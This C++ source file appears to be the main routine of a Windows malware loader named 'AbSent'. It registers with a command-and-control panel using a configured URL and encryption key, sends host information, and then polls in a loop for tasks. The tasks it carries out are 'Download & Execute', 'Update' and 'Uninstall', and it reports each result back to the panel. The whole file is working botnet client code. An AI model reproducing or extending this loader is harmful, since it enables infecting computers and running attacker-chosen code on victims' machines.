#include "stdafx.h"

#include <iostream>
#include <string>
#include <list>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <chrono>
#include <thread>

#include "AbSent\json.h"
#include "AbSent\config.h"
#include "AbSent\info\info.h"
#include "AbSent\comm\http.h"
#include "AbSent\tasks\downloadExec.h"
#include "AbSent\tasks\uninstall.h"
#include "AbSent\tasks\update.h"

#include "AbSent\comm\panel.h"


int main()
{
	absent::config::config config = absent::config::load();
	absent::info::info info(config.programNeedles);

	std::cout << "Build Settings: " << config.panelURL << config.gatePATH << std::endl;

	nlohmann::json responce = absent::panel::firstKnock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey);
	while (true)
	{
		if (responce["task"] != "N/A")
		{
			if (responce["task"] == "Download & Execute") 
			{ 
				bool success = absent::tasks::download_execute(responce["taskParm"]);
				if (success) { absent::panel::knock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey, responce["taskId"], false); }
				else { absent::panel::knock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey, responce["taskId"], true); }
			}
			if (responce["task"] == "Update")
			{
				bool success = absent::tasks::update(responce["taskParm"]);
				if (success) { absent::panel::knock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey, responce["taskId"], false); ExitProcess(0); }
				else { absent::panel::knock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey, responce["taskId"], true); }
			}
			if (responce["task"] == "Uninstall")
			{
				bool success = absent::tasks::uninstall();
				if (success) { absent::panel::knock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey, responce["taskId"], false); ExitProcess(0); }
				else { absent::panel::knock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey, responce["taskId"], true); }
			}
		}
		std::this_thread::sleep_for(std::chrono::seconds(config.reportInt));
		responce = absent::panel::knock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey, "N/A", false);
	}

	return 0;
}